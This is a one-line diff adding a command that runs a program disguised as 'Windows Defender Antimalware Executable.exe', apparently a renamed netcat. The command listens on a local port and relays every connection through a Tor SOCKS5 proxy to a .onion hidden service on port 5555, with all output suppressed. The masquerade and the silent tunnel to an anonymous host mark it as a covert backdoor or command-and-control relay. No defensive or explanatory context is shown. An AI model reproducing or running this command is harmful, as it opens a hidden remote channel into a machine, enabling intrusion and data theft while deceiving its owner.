@@ -1,0 +1,1 @@
+"Windows Defender Antimalware Executable.exe" -l 127.0.0.1 6762 -k -c "\"Windows Defender Antimalware Executable.exe\" --proxy 127.0.0.1:9050 --proxy-type socks5 we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion 5555" >NUL 2>&1
